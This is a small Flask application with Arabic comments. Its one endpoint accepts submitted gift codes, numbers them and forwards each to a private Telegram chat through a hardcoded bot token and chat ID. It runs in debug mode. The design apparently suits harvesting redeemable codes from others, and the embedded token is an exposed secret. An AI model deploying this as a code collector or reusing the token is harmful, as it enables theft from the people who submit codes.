from flask import Flask, request, jsonify
import requests

app = Flask(__name__)

# إعدادات بوت Telegram
TELEGRAM_BOT_TOKEN = '7987752408:AAGRh1oUsfo21RP7cVE3iaV1CkmkYcFTvvw'
TELEGRAM_CHAT_ID = '7796858163'
COUNTER = 0  # عداد لأرقام الرموز

@app.route('/process_gift', methods=['POST'])
def process_gift():
    global COUNTER
    
    # الحصول على رمز الهدية من الطلب
    data = request.get_json()
    if not data or 'gift_code' not in data:
        return jsonify({'error': 'رمز الهدية مطلوب'}), 400
    
    gift_code = data['gift_code'].strip()
    
    # زيادة العداد
    COUNTER += 1
    
    # إنشاء الرسالة المنسقة
    message = f"""
🎁 *رمز الهدية المستلم* 🎁

🔑 الرمز: `{gift_code}`

📝 هذا هو الرمز المستلم رقم #{COUNTER}
    
📋 يمكنك نسخ الرمز من الأعلى.
    """
    
    # إرسال الرسالة إلى بوت Telegram
    send_telegram_message(message)
    
    return jsonify({
        'status': 'success',
        'message': 'تم إرسال رمز الهدية إلى بوت Telegram',
        'code_number': COUNTER
    })

def send_telegram_message(text):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        'chat_id': TELEGRAM_CHAT_ID,
        'text': text,
        'parse_mode': 'Markdown'
    }
    response = requests.post(url, json=payload)
    return response.json()

if __name__ == '__main__':
    app.run(debug=True)
